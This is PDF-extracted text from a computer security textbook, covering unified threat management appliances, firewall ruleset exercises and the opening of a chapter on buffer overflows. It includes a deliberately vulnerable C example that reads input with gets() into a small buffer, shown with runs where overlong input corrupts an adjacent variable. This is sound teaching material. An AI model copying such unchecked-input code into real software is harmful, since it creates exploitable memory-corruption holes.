       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 334, 'page_label': '333'}, page_content='9.7 / EXAmPLE: uNIFIED THREAT mANAGEmENT PRODuCTS  333\\nOne approach to reducing the administrative and performance burden is to \\nreplace all inline network products (firewall, IPS, IDS, VPN, antispam, antisypware, \\nand so on) with a single device that integrates a variety of approaches to dealing with \\nnetwork-based attacks. The market analyst firm IDC refers to such a device as a unified \\nthreat management (UTM) system and defines UTM as follows: “Products that include \\nmultiple security features integrated into one box. To be included in this category, [an \\nappliance] must be able to perform network firewalling, network intrusion detection \\nand prevention and gateway anti-virus. All of the capabilities in the appliance need not \\nbe used concurrently, but the functions must exist inherently in the appliance.”\\nA significant issue with a UTM device is performance, both throughput and \\nlatency. [MESS06] reports that typical throughput losses for current commercial \\ndevices is 50%. Thus, customers are advised to get very high-performance, high-\\nthroughput devices to minimize the apparent performance degradation.\\nFigure 9.6 is a typical UTM appliance architecture. The following functions are \\nnoteworthy:\\n1. Inbound traffic is decrypted if necessary before its initial inspection. If the device \\nfunctions as a VPN boundary node, then IPSec decryption would take place here.\\nFigure 9.6 Unified Threat Management Appliance\\nSource: Based on [JAME06].\\nClean controlled traf f ic\\nRaw incoming traf f ic\\nRouting module\\nVPN module\\nFirewall module\\nAntivirus\\nengine\\nHeuristic\\nscan\\nengine\\nAnomaly\\ndetection\\nActivity\\ninspection\\nengine\\nWeb f iltering module\\nAntispam module\\nVPN module\\nBandwidth shaping module\\nIDS engine\\nIPS engine\\nLogging and reporting module\\nData analysis engine\\nM09_STAL0611_04_GE_C09.indd   333 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 335, 'page_label': '334'}, page_content='334  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\n2. An initial firewall module filters tr affic, discarding packets that violate rules  \\nand/or passing packets that conform to rules set in the firewall policy.\\n3. Beyond this point, a number of modules process individual packets and flows of \\npackets at various protocols levels. In this particular configuration, a data analysis \\nengine is responsible for keeping track of packet flows and coordinating the work \\nof antivirus, IDS, and IPS engines.\\n4. The data analysis engine also reassembles multipacket payloads for content analy-\\nsis by the antivirus engine and the Web filtering and antispam modules.\\n5. Some incoming traffic may need to be reencrypted to maintain security of the flow \\nwithin the enterprise network.\\n6. All detected threats are reported to the logging and reporting module, which is \\nused to issue alerts for specified conditions and for forensic analysis.\\n7. The bandwidth-shaping module can use various priority and quality-of-service \\n(QoS) algorithms to optimize performance.\\nAs an example of the scope of a UTM appliance, Tables 9.3 and 9.4 list some \\nof the attacks that the UTM device marketed by Secure Computing is designed to \\ncounter.\\nAttacks and Internet Threats Protections\\nTCP\\n• Invalid port numbers\\n• Invalid sequence\\n• Numbers\\n• SYN floods\\n• XMAS tree attacks\\n• Invalid CRC values\\n• Zero length\\n• Random data as TCP\\n• Header\\n• TCP hijack attempts\\n• TCP spoofing attacks\\n• Small PMTU attacks\\n• SYN attack\\n• Script Kiddie attacks\\n• Packet crafting:  different \\nTCP options set\\n• Enforce correct \\nTCP flags\\n• Enforce TCP \\nheader length\\n• Ensures a proper \\nthree-way handshake\\n• Closes TCP session \\ncorrectly\\n• 2 sessions one on \\nthe inside and one \\nof the outside\\n• Enforce correct \\nTCP flag usage\\n• Manages TCP \\n session timeouts\\n• Blocks SYN attack\\n• Reassembly of packets \\nensuring correctness\\n• Properly handles TCP \\n timeouts and retransmits \\ntimers\\n• All TCP proxies are \\nprotected\\n• Traffic Control through \\naccess lists\\n• Drop TCP packets on \\nports not open\\n• Proxies block packet \\ncrafting\\nUDP\\n• Invalid UDP packets\\n• Random UDP data \\nto bypass rules\\n• Connection pediction\\n• UDP port scanning\\n• Verify correct UDP packet\\n• Drop UDP packets on ports not open\\nTable 9.3 Sidewinder G2 Security Appliance Attack Protections Summary—Transport-Level Examples\\nM09_STAL0611_04_GE_C09.indd   334 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 336, 'page_label': '335'}, page_content='9.7 / EXAmPLE: uNIFIED THREAT mANAGEmENT PRODuCTS  335\\nAttacks and Internet Threats Protections\\nDNS\\nIncorrect NXDOMAIN responses from AAAA  \\nqueries could cause denial-of-service conditions.\\n• Does not allow negative caching\\n• Prevents DNS cache poisoning\\nISC BIND 9 before 9.2.1 allows remote attackers to \\ncause a denial of service (shutdown) via a malformed \\nDNS packet that triggers an error condition that is \\nnot properly handled when the rdataset parameter to \\nthe dns_message_findtype() function in message.c is \\nnot NULL.\\n• Sidewinder G2 prevents malicious use of  improperly \\nformed DNS messages to affect firewall operations.\\n• Prevents DNS query attacks\\n• Prevents DNS answer attacks\\nDNS information prevention and other DNS  \\nabuses.\\n• Prevent zone transfers and queries\\n• True split DNS protect by Type Enforcement  \\ntechnology to allow public and private DNS zones.\\n• Ability to turn off recursion\\nFTP\\n• FTP bounce attack\\n• PASS attack\\n• FTP Port injection attacks\\n• TCP segmentation attack\\n• Sidewinder G2 has the ability to filter FTP  \\ncommands to prevent these attacks\\n• True network separation prevents segmentation \\nattacks.\\nSQL\\nSQL Net man in the middle attacks • Smart proxy protected by Type Enforcement \\ntechnology\\n• Hide Internal DB through nontransparent \\nconnections.\\nReal-Time Streaming Protocol (RTSP)\\n• Buffer overflow\\n• Denial of service\\n• Smart proxy protected by Type Enforcement \\ntechnology\\n• Protocol validation\\n• Denies multicast traffic\\n• Checks setup and teardown methods\\n• Verifies PNG and RTSP protocol and discards all \\nothers\\n• Auxiliary port monitoring\\nSNMP\\n• SNMP flood attacks\\n• Default community attack\\n• Brute force attack\\n• SNMP put attack\\n• Filter SNMP version traffic 1, 2c\\n• Filter Read, Write, and Notify messages\\n• Filter OIDS\\n• Filter PDU (Protocol Data Unit)\\nSSH\\n• Challenge Response buffer overflows\\n• SSHD allows users to override “Allowed \\nAuthentications”\\n• OpenSSH buffer_append_space buffer overflow\\n• OpenSSH/PAM challenge Response buffer \\noverflow\\n• OpenSSH channel code offer-by-one\\nSidewinder G2 v6.x’s embedded Type Enforcement \\ntechnology strictly limits the capabilities of Secure \\nComputing’s modified versions of the OpenSSH \\ndaemon code.\\nTable 9.4  Sidewinder G2 Security Appliance Attack Protections Summary—Application-Level \\nExamples\\n(Continued)\\nM09_STAL0611_04_GE_C09.indd   335 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 337, 'page_label': '336'}, page_content='336  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nAttacks and Internet Threats Protections\\nSMTP\\n• Sendmail buffer overflows\\n• Sendmail denial of service attacks\\n• Remote buffer overflow in sendmail\\n• Sendmail address parsing buffer overflow\\n• SMTP protocol anomalies\\n• Split Sendmail architecture protected by Type \\nEnforcement technology\\n• Sendmail customized for controls\\n• Prevents buffer overflows through Type \\n Enforcement technology\\n• Sendmail checks SMTP protocol anomalies\\n• SMTP worm attacks\\n• SMTP mail flooding\\n• Relay attacks\\n• Viruses, Trojans, worms\\n• E-mail addressing spoofing\\n• MIME attacks\\n• Phishing e-mails\\n• Protocol validation\\n• Antispam filter\\n• Mail filters—size, keyword\\n• Signature antivirus\\n• Antirelay\\n• MIME/Antivirus filter\\n• Firewall antivirus\\n• Antiphishing through virus scanning\\nSpyware Applications\\n• Adware used for collecting information for market-\\ning purposes\\n• Stalking horses\\n• Trojan horses\\n• Malware\\n• Backdoor Santas\\n• SmartFilter® URL filtering capability built in with \\nSidewinder G2 can be configured to filter Spyware \\nURLs, preventing downloads.\\nTable 9.4 (Continued)\\n 9.8 KEY TERMS, REVIEW QUESTIONS, AND PROBLEMS\\nKey Terms\\napplication-level gateway\\nbastion host\\ncircuit-level gateway\\ndemilitarized zone (DMZ)\\ndistributed firewalls\\nfirewall\\nhost-based firewall\\nhost-based IPS\\nintrusion prevention system \\n(IPS)\\nIP address spoofing\\nIP security (IPSec)\\nnetwork-based IPS\\npacket filtering firewall\\npersonal firewall\\nproxy\\nstateful packet inspection firewall\\ntiny fragment attack\\nunified threat management \\n(UTM)\\nvirtual private network (VPN)\\nReview Questions\\n 9.1 List the different types of firewalls.\\n 9.2 List four characteristics used by firewalls to control access and enforce a security policy.\\n 9.3 Which type of attacks is possible on a packet filtering firewall?\\n 9.4 How does a traditional packet filter make filtering decision?\\n 9.5 What is the dif ference between a packet filtering firewall and a stateful inspection \\nfirewall?\\n 9.6 What is the difference between a gateway and a firewall?\\nM09_STAL0611_04_GE_C09.indd   336 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 338, 'page_label': '337'}, page_content='9.8 / KEy TERmS, REvIEW QuESTIONS, AND PROBLEmS  337\\n 9.7 Describe a situation where circuit-level gateways can be used.\\n 9.8 How do FTP and Telnet work through a firewall?\\n 9.9 What are the common characteristics of a bastion host?\\n 9.10 Why is it useful to have host-based firewalls?\\n 9.11 What is a DMZ network and what types of systems would you expect to find on such \\nnetworks?\\n 9.12 What are the differences between an IDS, an IPS, and a firewall?\\n 9.13 List the types of malicious behaviors addressed by a Host-based Intrusion Prevention \\nSystem (HIPS)?\\n 9.14 What are the different places an IPS can be based?\\n 9.15 List at least three malicious behaviors addressed by HIPS.\\n 9.16 List a few methods used by a NIPS device to identify malicious packets.\\nProblems\\n 9.1 As was mentioned in Section 9.3, the application gateway does not permit an end-to-\\nend TCP connection; rather, it sets up two TCP connections, one between itself and \\na TCP user on an inner host and one between itself and a TCP user on an outside \\nhost. The disadvantage of this approach is the additional processing overhead on each \\nconnection since the gateway must examine and forward all traffic in both directions. \\nDescribe at least one more limitation of this approach which is not discussed.\\n 9.2 In an IPv4 packet, the size of the payload in the first fragment, in octets, is equal to \\nTotal Length - (4 * Internet Header Length). If this value is less than the required \\nminimum (8 octets for TCP), then this fragment and the entire packet are rejected. \\nSuggest an alternative method of achieving the same result using only the Fragment \\nOffset field.\\n 9.3 RFC 791, the IPv4 protocol specification, describes a reassembly algorithm that results \\nin new fragments overwriting any overlapped portions of previously received frag -\\nments. Given such a reassembly implementation, an attacker could construct a series \\nof packets in which the lowest (zero-offset) fragment would contain innocuous data \\n(and thereby be passed by administrative packet filters) and in which some subsequent \\npacket having a nonzero offset would overlap TCP header information (  destination \\nport, for instance) and cause it to be modified. The second packet would be passed \\nthrough most filter implementations because it does not have a zero fragment offset. \\nSuggest a method that could be used by a packet filter to counter this attack.\\n 9.4 Table 9.5 shows a sample of a packet filter firewall ruleset for an imaginary network of \\nIP address that range from 192.168.1.0 to 192.168.1.254. Describe the effect of each rule.\\n 9.5 SMTP (Simple Mail Transfer Protocol) is the standard protocol for transferring mail \\nbetween hosts over TCP . A TCP connection is set up between a user agent and a \\nSource Address Souce Port Dest Address Dest Port Action\\n1 Any Any 192.168.1.0 71023 Allow\\n2 192.168.1.1 Any Any Any Deny\\n3 Any Any 192.168.1.1 Any Deny\\n4 192.168.1.0 Any Any Any Allow\\n5 Any Any 192.168.1.2 SMTP Allow\\n6 Any Any 192.168.1.3 HTTP Allow\\n7 Any Any Any Any Deny\\nTable 9.5 Sample Packet Filter Firewall Ruleset\\nM09_STAL0611_04_GE_C09.indd   337 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 339, 'page_label': '338'}, page_content='338  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\nserver program. The server listens on TCP port 25 for incoming connection requests. \\nThe user end of the connection is on a TCP port number above 1023. Suppose you \\nwish to build a packet filter rule set allowing inbound and outbound SMTP traffic. \\nYou generate the following rule set:\\nRule Direction Src Addr Dest Addr Protocol Dest Port Action\\nA In External Internal TCP 25 Permit\\nB Out Internal External TCP 71023 Permit\\nC Out Internal External TCP 25 Permit\\nD In External Internal TCP 71023 Permit\\nE Either Any Any Any Any Deny\\na. Describe the effect of each rule.\\nb. Your host in this example has IP address 172.16.1.1. Someone tries to send e-mail \\nfrom a remote host with IP address 192.168.3.4. If successful, this generates an \\nSMTP dialogue between the remote user and the SMTP server on your host \\n consisting of SMTP commands and mail. Additionally, assume a user on your host \\ntries to send e-mail to the SMTP server on the remote system. Four typical packets \\nfor this scenario are as shown:\\nPacket Direction Src Addr Dest Addr Protocol Dest Port Action\\n1 In 192.168.3.4 172.16.1.1 TCP 25 ?\\n2 Out 172.16.1.1 192.168.3.4 TCP 1234 ?\\n3 Out 172.16.1.1 192.168.3.4 TCP 25 ?\\n4 In 192.168.3.4 172.16.1.1 TCP 1357 ?\\nIndicate which packets are permitted or denied and which rule is used in each case.\\nc. Someone from the outside world (10.1 .2.3) attempts to open a connection from \\nport 5150 on a remote host to the Web proxy server on port 8080 on one of your \\nlocal hosts (172.16.3.4) in order to carry out an attack. Typical packets are as follows:\\nPacket Direction Src Addr Dest Addr Protocol Dest Port Action\\n5 In 10.1.2.3 172.16.3.4 TCP 8080 ?\\n6 Out 172.16.3.4 10.1.2.3 TCP 5150 ?\\nWill the attack succeed? Give details.\\n 9.6 To provide more protection, the rule set from the preceding problem is modified as \\nfollows:\\nRule Direction Src Addr Dest Addr Protocol Src Port Dest Port Action\\nA In External Internal TCP 71023 25 Permit\\nB Out Internal External TCP 25 71023 Permit\\nC Out Internal External TCP 71023 25 Permit\\nD In External Internal TCP 25 71023 Permit\\nE Either Any Any Any Any Any Deny\\nM09_STAL0611_04_GE_C09.indd   338 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 340, 'page_label': '339'}, page_content='9.8 / KEy TERmS, REvIEW QuESTIONS, AND PROBLEmS  339\\na. Describe the change.\\nb. Apply this new rule set to the same six packets of the preceding problem. Indicate \\nwhich packets are permitted or denied and which rule is used in each case.\\n 9.7 A hacker uses port 25 as the client port on his or her end to attempt to open a connec-\\ntion to your Web proxy server.\\na. The following packets might be generated:\\nPacket Direction Src Addr Dest Addr Protocol Src Port Dest Port Action\\n7 In 10.1.2.3 172.16.3.4 TCP 25 8080 ?\\n8 Out 172.16.3.4 10.1.2.3 TCP 8080 25 ?\\nExplain why this attack will succeed, using the rule set of the preceding problem.\\nb. When a TCP connection is initiated, the ACK bit in the TCP header is not set. \\nSubsequently, all TCP headers sent over the TCP connection have the ACK bit set. \\nUse this information to modify the rule set of the preceding problem to prevent \\nthe attack just described.\\n 9.8 List the different types of malicious behavior that are addressed by HIPS in general \\nand also the areas for which HIPS offer desktop protection.\\n 9.9 As was mentioned in Section 9.3, when a client wishes to establish a connection to \\nan object that is r eachable only via a firewall, it must open a TCP connection to the \\nappropriate SOCKS port on the SOCKS server system. Even if the client wishes to \\nsend UDP segments, first a TCP connection is opened. Moreover, UDP segments can \\nbe forwarded only as long as the TCP connection remains opened. Why?\\n 9.10 Consider the threat of “theft/breach of proprietary or confidential information held in \\nkey data files on the system.” One method by which such a breach might occur is the \\naccidental/deliberate e-mailing of information to a user outside of the organization. \\nA possible countermeasure to this is to require all external e-mail to be given a sen -\\nsitivity tag (classification if you like) in its subject and for external e-mail to have the \\nlowest sensitivity tag. Discuss how this measure could be implemented in a firewall \\nand what components and architecture would be needed to do this.\\n 9.11 You are given the following “informal firewall policy” details to be implemented using \\na firewall such as that in Figure 9.2:\\n1. E-mail may be sent using SMTP in both directions through the firewall, but it must \\nbe relayed via the DMZ mail gateway that provides header sanitization and con -\\ntent filtering. External e-mail must be destined for the DMZ mail server.\\n2. Users inside may r etrieve their e-mail from the DMZ mail gateway, using either \\nPOP3 or POP3S, and authenticate themselves.\\n3. Users outside may r etrieve their e-mail from the DMZ mail gateway, but only if \\nthey use the secure POP3 protocol and authenticate themselves.\\n4. Web requests (both insecure and secure) are allowed from any internal user out \\nthrough the firewall but must be relayed via the DMZ Web proxy, which provides \\ncontent filtering (noting this is not possible for secure requests), and users must \\nauthenticate with the proxy for logging.\\n5. Web requests (both insecure and secure) are allowed from anywhere on the Inter-\\nnet to the DMZ Web server.\\n6. DNS lookup requests by internal users ar e allowed via the DMZ DNS server, \\nwhich queries to the Internet.\\n7. External DNS requests are provided by the DMZ DNS server.\\n8. Management and update of information on the DMZ servers is allowed using \\nsecure shell connections from relevant authorized internal users (may have differ-\\nent sets of users on each system as appropriate).\\nM09_STAL0611_04_GE_C09.indd   339 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 341, 'page_label': '340'}, page_content='340  CHAPTER 9 / FIREWALLS AND INTRuSION PREvENTION SySTEmS \\n9. SNMP management requests are permitted from the internal management hosts \\nto the firewalls, with the firewalls also allowed to send management traps (i.e., \\nnotification of some event occurring) to the management hosts.\\nDesign suitable packet filter rule sets (similar to those shown in Table 9.1) to be imple-\\nmented on the “External Firewall” and the “Internal Firewall” to satisfy the afore -\\nmentioned policy requirements.\\n 9.12 We have an internal Web server, used only for testing purposes, at IP address 5.6.7 .8 \\non our internal corporate network. The packet filter is situated at a chokepoint \\nbetween our internal network and the rest of the Internet. Can such a packet filter \\nblock all attempts by outside hosts to initiate a direct TCP connection to this internal \\nWeb server? If yes, design suitable packet filter rule sets (similar to those shown in \\nTable\\xa09.1) that provides this functionality; if no, explain why a (stateless) packet filter \\ncannot do it.\\n 9.13 Explain the strengths and weaknesses of each of the following fir ewall deployment \\nscenarios in defending servers, desktop machines, and laptops against network threats.\\na. A firewall at the network perimeter.\\nb. Firewalls on every end host machine.\\nc. A network perimeter firewall and firewalls on every end host machine\\n 9.14 Consider the example Snort rule given in Chapter 8 to detect a SYN-FIN at tack. \\nAssuming this rule is used on a Snort Inline IPS, how would you modify the rule to \\nblock such packets entering the home network?\\n 9.15 What is the Digital Immune System? Explain its characteristics in detail.\\nM09_STAL0611_04_GE_C09.indd   340 10/11/17   2:59 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 342, 'page_label': '341'}, page_content='Buffer Overflow\\nCHAPTER \\nPart two:  Software and System \\nSecurity\\n10.1 Stack Overflows\\nBuffer Overflow Basics\\nStack Buffer Overflows\\nShellcode\\n10.2 Defending Against Buffer Overflows\\nCompile-Time Defenses\\nRun-Time Defenses\\n10.3 Other Forms of Overflow Attacks\\nReplacement Stack Frame\\nReturn to System Call\\nHeap Overflows\\nGlobal Data Area Overflows\\nOther Types of Overflows\\n10.4 Key Terms, Review Questions, and Problems\\n341\\nM10_STAL0611_04_GE_C10.indd   341 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 343, 'page_label': '342'}, page_content='342  CHAPTER 10 / BuffER OvERflOw\\nIn this chapter, we turn our attention specifically to buffer overflow attacks. This \\ntype of attack is one of the most common attacks seen and results from careless \\nprogramming in applications. A look at the list of vulnerability advisories from \\norganizations such as CERT or SANS continue to include a significant number of \\nbuffer overflow or heap overflow exploits, including a number of serious, remotely \\nexploitable vulnerabilities. Similarly, several of the items in the CWE/SANS Top 25 \\nMost Dangerous Software Errors list, Risky Resource Management category, are \\nbuffer overflow variants. These can result in exploits to both operating systems and \\ncommon applications, and still comprise the majority of exploits in widely deployed \\nexploit toolkits [VEEN12]. Yet this type of attack has been known since it was first \\nwidely used by the Morris Internet Worm in 1988, and techniques for preventing \\nits occurrence are well-known and documented. Table 10.1 provides a brief history \\nof some of the more notable incidents in the history of buffer overflow exploits. \\nUnfortunately, due to a legacy of buggy code in widely deployed operating systems \\nand applications, a failure to patch and update many systems, and continuing care -\\nless programming practices by programmers, it is still a major source of concern to \\nsecurity practitioners. This chapter focuses on how a buffer overflow occurs and \\nwhat methods can be used to prevent or detect its occurrence.\\nWe begin with an introduction to the basics of buffer overflow. Then, we \\npresent details of the classic stack buffer overflow. This includes a discussion of \\nhow functions store their local variables on the stack, and the consequence of \\nattempting to store more data in them than there is space available. We continue \\nwith an overview of the purpose and design of shellcode, which is the custom code \\ninjected by an attacker and to which control is transferred as a result of the buffer  \\noverflow.\\nNext, we consider ways of defending against buffer overflow attacks. We start \\nwith the obvious approach of preventing them by not writing code that is vulner -\\nable to buffer overflows in the first place. However, given the large existing body \\nof buggy code, we also need to consider hardware and software mechanisms that \\ncan detect and thwart buffer overflow attacks. These include mechanisms to protect \\nexecutable address space, techniques to detect stack modifications, and approaches \\nthat randomize the address space layout to hinder successful execution of these \\nattacks.\\nFinally, we will briefly survey some of the other overflow techniques, including \\nreturn to system call and heap overflows, and mention defenses against these.\\nLearning Objectives\\nAfter studying this chapter, you should be able to:\\n ◆ Define what a buffer overflow is, and list possible consequences.\\n ◆ Describe how a stack buffer overflow works in detail.\\n ◆ Define shellcode and describe its use in a buffer overflow attack.\\n ◆ List various defenses against buffer overflow attacks.\\n ◆ List a range of other types of buffer overflow attacks.\\nM10_STAL0611_04_GE_C10.indd   342 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 344, 'page_label': '343'}, page_content='10.1 / STACK OvERflOwS  343\\n 10.1 STACK OVERFLOWS\\nBuffer Overflow Basics\\nA buffer overflow, also known as a buffer overrun or buffer overwrite, is defined in \\nNISTIR 7298 (Glossary of Key Information Security Terms, May 2013) as follows:\\n1988 The Morris Internet Worm uses a buffer overflow exploit in “fingerd” as one of its attack \\nmechanisms.\\n1995 A buffer overflow in NCSA httpd 1.3 was discovered and published on the Bugtraq \\n mailing list by Thomas Lopatic.\\n1996 Aleph One published “Smashing the Stack for Fun and Profit” in Phrack magazine, giving \\na step by step introduction to exploiting stack-based buffer overflow vulnerabilities.\\n2001 The Code Red worm exploits a buffer overflow in Microsoft IIS 5.0.\\n2003 The Slammer worm exploits a buffer overflow in Microsoft SQL Server 2000.\\n2004 The Sasser worm exploits a buffer overflow in Microsoft Windows 2000/XP Local Security \\nAuthority Subsystem Service (LSASS).\\nTable 10.1 A Brief History of Some Buffer Overflow Attacks\\nBuffer Overrun: A condition at an interface under which more input can be placed \\ninto a buffer or data holding area than the capacity allocated, overwriting other \\ninformation. Attackers exploit such a condition to crash a system or to insert \\n specially crafted code that allows them to gain control of the system.\\nA buffer overflow can occur as a result of a programming error when a process \\nattempts to store data beyond the limits of a fixed-sized buffer and consequently \\noverwrites adjacent memory locations. These locations could hold other program \\nvariables or parameters or program control flow data such as return addresses and \\npointers to previous stack frames. The buffer could be located on the stack, in the \\nheap, or in the data section of the process. The consequences of this error include cor-\\nruption of data used by the program, unexpected transfer of control in the program, \\npossible memory access violations, and very likely eventual program termination. \\nWhen done deliberately as part of an attack on a system, the transfer of control could \\nbe to code of the attacker’s choosing, resulting in the ability to execute arbitrary code \\nwith the privileges of the attacked process.\\nTo illustrate the basic operation of a buffer overflow, consider the C main func-\\ntion given in Figure 10.1a. This contains three variables (valid, str1, and str2),1 \\nwhose values will typically be saved in adjacent memory locations. The order and \\n1In this example, the flag variable is saved as an integer rather than a Boolean. This is done both because \\nit is the classic C style, and to avoid issues of word alignment in its storage. The buffers are deliberately \\nsmall to accentuate the buffer overflow issue being illustrated.\\nM10_STAL0611_04_GE_C10.indd   343 10/11/17   3:02 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 345, 'page_label': '344'}, page_content='344  CHAPTER 10 / BuffER OvERflOw\\nint main(int argc, char *argv[]) {\\n    int valid = FALSE;\\n    char str1[8];\\n    char str2[8];\\n    next_tag(str1);\\n    gets(str2);\\n    if (strncmp(str1, str2, 8) == 0)\\n       valid = TRUE;\\n    printf(\"buffer1: str1(%s), str2(%s), valid(%d)\\\\n\", str1, str2, valid);\\n}\\nFigure 10.1 Basic Buffer Overflow Example\\n(a) Basic buffer overflow C code\\n(b) Basic buffer overflow example runs\\n$ cc -g -o buffer1 buffer1.c\\n$ ./buffer1\\nSTART\\nbuffer1: str1(START), str2(START), valid(1)\\n$ ./buffer1\\nEVILINPUTVALUE\\nbuffer1: str1(TVALUE), str2(EVILINPUTVALUE), valid(0)\\n$ ./buffer1\\nBADINPUTBADINPUT\\nbuffer1: str1(BADINPUT), str2(BADINPUTBADINPUT), valid(1)\\nlocation of these will depend on the type of variable (local or global), the language \\nand compiler used, and the target machine architecture. However, for the purpose of \\nthis example, we will assume they are saved in consecutive memory locations, from \\nhighest to lowest, as shown in Figure 10.2.2 This will typically be the case for local \\nvariables in a C function on common processor architectures such as the Intel Pen -\\ntium family. The purpose of the code fragment is to call the function  next_\\ntag(str1) to copy into str1 some expected tag value. Let us assume this will be \\nthe string START. It then reads the next line from the standard input for the program \\nusing the C library gets() function then compares the string read with the expected \\ntag. If the next line did indeed contain just the string START, this comparison would \\nsucceed, and the variable VALID would be set to TRUE.3 This case is shown in the first \\n2Address and data values are specified in hexadecimal in this and related figures. Data values are also \\nshown in ASCII where appropriate.\\n3In C, the logical values FALSE and TRUE are simply integers with the values 0 and 1 (or indeed any non-\\nzero value), respectively. Symbolic defines are often used to map these symbolic names to their underlying \\nvalue, as was done in this program.\\nM10_STAL0611_04_GE_C10.indd   344 10/11/17   3:02 PM'),\n",
